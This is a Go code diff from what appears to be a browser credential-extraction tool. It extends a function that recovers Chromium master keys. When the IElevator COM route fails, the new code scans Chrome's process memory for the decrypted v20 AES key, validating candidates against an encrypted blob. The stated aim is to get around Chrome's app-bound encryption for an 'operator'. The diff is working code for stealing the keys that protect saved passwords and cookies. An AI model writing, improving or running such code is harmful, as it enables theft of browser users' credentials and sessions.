@@ -48,19 +48,25 @@ func getChromiumMasterKey(profileDir, browserName string) (*chromiumKeys, error)
 		v10Err = err
 	}
 
-	// Always attempt v20 via a crash-isolated subprocess. If the IElevator
-	// COM call raises an SEH exception (0xc0000005), the subprocess crashes
-	// and we see a non-zero exit code — fall through gracefully to v10 only.
-	// Errors are surfaced in the master-key finding so the operator can tell
-	// what specifically failed.
-	var v20ErrStr string
+	// Attempt 1: crash-isolated IElevator COM subprocess (Chrome < 130).
+	// Chrome 130+ added binary signature verification so this fails for
+	// unsigned binaries — we fall through to memory scanning.
 	if key, err := getChromiumAppBoundKeySubprocess(profileDir, browserName); err != nil {
 		v20Err = err
-		v20ErrStr = err.Error()
 	} else {
 		out.V20 = key
 	}
-	_ = v20ErrStr
+
+	// Attempt 2: process memory scan — when Chrome is running the decrypted
+	// v20 AES key lives in heap memory. Scan MEM_PRIVATE pages and validate
+	// each 32-byte candidate against a known v20 blob (AES-GCM oracle).
+	// Skipped when IElevator already succeeded.
+	if out.V20 == nil {
+		if key, err := ScanChromeProcessMemory(profileDir, browserName); err == nil {
+			out.V20 = key
+		}
+		// Memory scan failure is silent — v20Err already captures the COM error.
+	}
 
 	if out.V10 == nil && out.V20 == nil {
 		return nil, fmt.Errorf("both key unwrap attempts failed: v10=%v; v20=%v", v10Err, v20Err)
